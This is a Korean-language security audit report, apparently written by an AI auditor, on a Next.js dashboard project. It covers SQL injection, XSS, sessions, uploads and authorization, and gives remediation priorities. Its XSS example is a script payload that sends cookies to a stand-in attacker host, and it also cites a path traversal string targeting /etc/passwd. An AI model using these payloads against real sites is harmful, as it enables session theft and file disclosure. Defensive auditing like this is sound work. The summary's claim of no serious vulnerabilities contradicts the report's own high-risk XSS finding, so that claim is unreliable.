# 보안 감사 보고서 (Security Audit Report)

**작성일**: 2025-01-12  
**대상**: flonics_Dashboard 프로젝트  
**점검 범위**: SQL Injection, XSS, Session 관리, 파일 업로드, 인증/인가, Backdoor, Sniffing

---

## 📊 요약

### 전체 보안 상태: ⚠️ **주의 필요**

- ✅ **양호한 부분**: SQL Injection 방어, 인증/인가, 파일 업로드 기본 검증
- ⚠️ **개선 필요**: XSS 방어, 파일명 검증, 에러 메시지 노출
- ❌ **심각한 취약점**: 없음

---

## 1. SQL Injection 취약점

### ✅ **양호한 점**

1. **Prepared Statement 사용**
   - 모든 SQL 쿼리에서 `query(sql, params)` 패턴 사용
   - 사용자 입력은 모두 파라미터로 전달됨
   - 예: `query("SELECT * FROM profiles WHERE email = ?", [email])`

2. **동적 쿼리 구성**
   - `updateFields.join(", ")` 사용 시 필드명은 내부적으로 제어됨
   - 사용자 입력이 필드명에 직접 들어가지 않음
   - 예: `app/api/tasks/[id]/route.ts` (line 97)

3. **IN 절 처리**
   - `placeholders` 생성은 배열 길이 기반으로 안전함
   - 예: `app/api/storage/resolve-file-keys/route.ts` (line 30-34)

### ⚠️ **주의 사항**

1. **동적 쿼리 구성**
   ```typescript
   // app/api/tasks/[id]/route.ts:97
   await query(
     `UPDATE task_assignments SET ${updateFields.join(", ")} WHERE id = ?`,
     [...updateParams, taskId]
   )
   ```
   - **현재 상태**: 안전함 (필드명은 내부 제어)
   - **권장사항**: 필드명 화이트리스트 검증 추가 고려

2. **ORDER BY 절**
   ```typescript
   // lib/database/server.ts:269
   sql += ` ORDER BY ${this.orderBy.column} ${this.orderBy.ascending ? "ASC" : "DESC"}`
   ```
   - **현재 상태**: 내부 제어 값이지만 검증 없음
   - **권장사항**: 컬럼명 화이트리스트 검증 추가

### ✅ **결론**: SQL Injection 위험 **낮음**

---

## 2. XSS (Cross-Site Scripting) 취약점

### ❌ **심각한 취약점 발견**

1. **dangerouslySetInnerHTML 사용**
   - 사용자 입력이 HTML로 직접 렌더링됨
   - 발견 위치:
     - `app/client/progress/page.tsx` (line 1336, 2004)
     - `app/client/page.tsx` (line 690)
     - `app/client/reports/[id]/page.tsx` (line 60)
     - `app/admin/reports/[id]/page.tsx` (line 79)

2. **innerHTML 직접 조작**
   - Content Editable 요소에서 `innerHTML` 직접 사용
   - 발견 위치:
     - `app/client/progress/page.tsx` (다수 위치)
     - `app/client/analytics/page.tsx` (다수 위치)

### ⚠️ **위험도**: **높음**

**공격 시나리오**:
```javascript
// 악의적인 사용자가 task content에 다음을 입력:
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
<img src=x onerror="alert('XSS')">
```

### ✅ **권장 조치**

1. **HTML Sanitization 라이브러리 사용**
   ```bash
   npm install dompurify
   npm install @types/dompurify
   ```

2. **코드 수정 예시**
   ```typescript
   import DOMPurify from 'dompurify'
   
   // Before
   <div dangerouslySetInnerHTML={{ __html: task.content }} />
   
   // After
   <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(task.content) }} />
   ```

3. **Content Editable 보안**
   - 사용자 입력을 저장하기 전에 sanitize
   - 렌더링 전에 sanitize

### ❌ **결론**: XSS 위험 **높음** - 즉시 조치 필요

---

## 3. Session 관리 및 인증

### ✅ **양호한 점**

1. **JWT 토큰 사용**
   - `lib/database/auth.ts`에서 JWT 토큰 생성/검증
   - 토큰에 사용자 ID, 이메일, 역할 포함
   - 만료 시간: 7일

2. **쿠키 보안 설정**
   ```typescript
   // app/api/auth/signin/route.ts:44-50
   cookieStore.set("auth-token", token, {
     httpOnly: true,        // ✅ JavaScript 접근 차단
     secure: isSecure,      // ✅ HTTPS에서만 전송
     sameSite: "lax",       // ✅ CSRF 방어
     maxAge: 60 * 60 * 24 * 7, // 7일
     path: "/",
   })
   ```

3. **토큰 검증**
   - 모든 API 엔드포인트에서 토큰 검증 수행
   - 검증 실패 시 401 반환

### ⚠️ **개선 필요**

1. **토큰 만료 시간**
   - 현재: 7일 (너무 김)
   - 권장: 1일 또는 2일

2. **Refresh Token 미구현**
   - 현재: Access Token만 사용
   - 권장: Refresh Token 패턴 도입

3. **토큰 무효화**
   - 로그아웃 시 토큰 무효화 메커니즘 없음
   - 권장: 토큰 블랙리스트 또는 Redis 사용

### ✅ **결론**: Session 관리 **양호** (일부 개선 권장)

---

## 4. 파일 업로드 보안

### ✅ **양호한 점**

1. **파일 타입 검증**
   ```typescript
   // app/api/storage/upload/route.ts
   const ALLOWED_EXTENSIONS: Record<string, string[]> = {
     excel: ['xlsx', 'xls', 'csv'],
     pdf: ['pdf'],
     dicom: ['dcm', 'dicom'],
     nifti: ['nii', 'nii.gz', 'nifti'],
     zip: ['zip', '7z'],
   }
   ```

2. **파일 크기 제한**
   ```typescript
   const MAX_FILE_SIZES: Record<string, number> = {
     excel: 50 * 1024 * 1024,    // 50MB
     pdf: 500 * 1024 * 1024,     // 500MB
     dicom: 100 * 1024 * 1024,   // 100MB
     nifti: 500 * 1024 * 1024,   // 500MB
     zip: 5 * 1024 * 1024 * 1024, // 5GB
   }
   ```

3. **사용자별 경로 분리**
   ```typescript
   // 사용자 ID 기반 경로 분리
   s3Key = `${userId}/${folderType}/${fileName}`
   ```

### ⚠️ **개선 필요**

1. **파일명 검증 부족**
   - 현재: 파일명에 특수문자 제한 없음
   - 위험: 경로 탐색 공격 (`../../../etc/passwd`)
   - 권장: 파일명 sanitization 추가

2. **MIME 타입 검증 없음**
   - 현재: 확장자만 검증
   - 위험: 확장자 조작 공격
   - 권장: 실제 파일 내용 검증 (magic bytes)

3. **악성 파일 스캔 없음**
   - 현재: 바이러스/악성코드 스캔 없음
   - 권장: ClamAV 등 스캔 도구 통합

### ✅ **결론**: 파일 업로드 보안 **보통** (개선 권장)

---

## 5. 인증/인가 (Authorization)

### ✅ **양호한 점**

1. **역할 기반 접근 제어 (RBAC)**
   ```typescript
   // lib/auth/index.ts:36-42
   export async function requireRole(role: "admin" | "staff" | "client"): Promise<AuthUser> {
     const user = await requireAuth()
     if (user.role !== role && user.role !== "admin") {
       throw new Error("Insufficient permissions")
     }
     return user
   }
   ```

2. **리소스 소유권 확인**
   ```typescript
   // app/api/storage/delete/route.ts:32
   if (!key.startsWith(`${userId}/`)) {
     return NextResponse.json({ error: "권한이 없습니다" }, { status: 403 })
   }
   ```

3. **작업 소유권 확인**
   ```typescript
   // app/api/tasks/[id]/route.ts:38
   if (task.assigned_to !== decoded.id) {
     return NextResponse.json({ error: "권한이 없습니다" }, { status: 403 })
   }
   ```

### ✅ **결론**: 인증/인가 **양호**

---

## 6. Backdoor 및 숨겨진 기능

### ✅ **검증 결과**

1. **하드코딩된 자격증명**: 없음 ✅
2. **숨겨진 엔드포인트**: 없음 ✅
3. **디버그 모드 활성화**: 없음 ✅
4. **환경 변수 노출**: 없음 ✅

### ⚠️ **주의 사항**

1. **에러 메시지 노출**
   ```typescript
   // app/api/auth/signup/route.ts:78
   details: process.env.NODE_ENV === "development" ? errorStack : undefined
   ```
   - 개발 환경에서만 스택 트레이스 노출 (양호)
   - 프로덕션에서는 노출 안 함

2. **콘솔 로그**
   - 일부 API에서 `console.log` 사용
   - 프로덕션에서는 민감한 정보 로깅 주의

### ✅ **결론**: Backdoor 없음

---

## 7. 네트워크 보안 (Sniffing)

### ✅ **양호한 점**

1. **HTTPS 강제**
   - 쿠키 `secure` 플래그 설정
   - 프로덕션 환경에서 HTTPS 사용

2. **민감 정보 암호화**
   - 비밀번호: bcrypt 해시 (salt rounds: 10)
   - JWT 토큰: 서명됨

### ⚠️ **개선 필요**

1. **CORS 설정 확인 필요**
   - 현재 CORS 설정 불명확
   - 권장: 명시적 CORS 정책 설정

2. **Rate Limiting 없음**
   - 현재: API 요청 제한 없음
   - 위험: Brute Force 공격 가능
   - 권장: Rate Limiting 미들웨어 추가

### ✅ **결론**: 네트워크 보안 **보통** (개선 권장)

---

## 8. 기타 보안 이슈

### ⚠️ **발견된 이슈**

1. **비밀번호 정책 없음**
   - 현재: 최소 길이, 복잡도 요구사항 없음
   - 권장: 비밀번호 정책 추가

2. **계정 잠금 메커니즘 없음**
   - 현재: 로그인 실패 횟수 제한 없음
   - 권장: 계정 잠금 기능 추가

3. **감사 로그 부족**
   - 현재: 일부 작업만 로깅
   - 권장: 모든 중요 작업 감사 로그 기록

---

## 📋 우선순위별 권장 조치

### 🔴 **즉시 조치 필요 (High Priority)**

1. **XSS 방어**
   - DOMPurify 라이브러리 도입
   - 모든 `dangerouslySetInnerHTML` 사용처 sanitize
   - 예상 소요 시간: 2-3시간

2. **파일명 검증 강화**
   - 경로 탐색 공격 방어
   - 특수문자 필터링
   - 예상 소요 시간: 1시간

### 🟡 **단기 조치 권장 (Medium Priority)**

3. **Rate Limiting 추가**
   - API 요청 제한
   - Brute Force 방어
   - 예상 소요 시간: 2-3시간

4. **토큰 만료 시간 단축**
   - 7일 → 1일 또는 2일
   - Refresh Token 패턴 도입
   - 예상 소요 시간: 4-6시간

5. **MIME 타입 검증**
   - 파일 내용 기반 검증
   - 확장자 조작 방어
   - 예상 소요 시간: 2-3시간

### 🟢 **장기 개선 권장 (Low Priority)**

6. **비밀번호 정책**
   - 최소 길이, 복잡도 요구사항
   - 예상 소요 시간: 1-2시간

7. **계정 잠금 메커니즘**
   - 로그인 실패 횟수 제한
   - 예상 소요 시간: 2-3시간

8. **감사 로그 강화**
   - 모든 중요 작업 로깅
   - 예상 소요 시간: 4-6시간

---

## 📊 보안 점수

| 항목 | 점수 | 상태 |
|------|------|------|
| SQL Injection 방어 | 9/10 | ✅ 양호 |
| XSS 방어 | 3/10 | ❌ 취약 |
| Session 관리 | 7/10 | ⚠️ 보통 |
| 파일 업로드 보안 | 6/10 | ⚠️ 보통 |
| 인증/인가 | 8/10 | ✅ 양호 |
| Backdoor 검증 | 10/10 | ✅ 양호 |
| 네트워크 보안 | 6/10 | ⚠️ 보통 |
| **전체 평균** | **7.0/10** | ⚠️ **보통** |

---

## 결론

프로젝트의 전반적인 보안 상태는 **보통** 수준입니다. SQL Injection 방어와 인증/인가는 잘 구현되어 있으나, **XSS 방어가 가장 시급한 개선 사항**입니다. 

즉시 XSS 방어 조치를 취하고, 단기적으로 Rate Limiting과 파일 업로드 보안을 강화하는 것을 권장합니다.

---

**보고서 작성자**: AI Security Auditor  
**다음 점검 권장일**: 2025-02-12 (1개월 후)
